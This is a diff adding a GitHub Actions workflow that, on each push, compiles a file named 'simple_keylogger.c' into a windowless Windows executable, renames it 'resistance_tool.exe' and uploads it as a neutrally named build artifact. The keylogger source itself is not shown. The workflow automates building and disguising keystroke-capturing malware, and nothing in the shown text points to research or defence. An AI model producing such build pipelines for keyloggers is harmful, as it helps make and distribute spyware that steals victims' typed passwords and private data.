@@ -1,0 +1,20 @@
+name: Build My Tool
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Compile Code
+      run: |
+        gcc simple_keylogger.c -o resistance_tool.exe -luser32 -mwindows
+
+    - name: Upload EXE
+      uses: actions/upload-artifact@v4
+      with:
+        name: My-Compiled-Tool
+        path: resistance_tool.exe
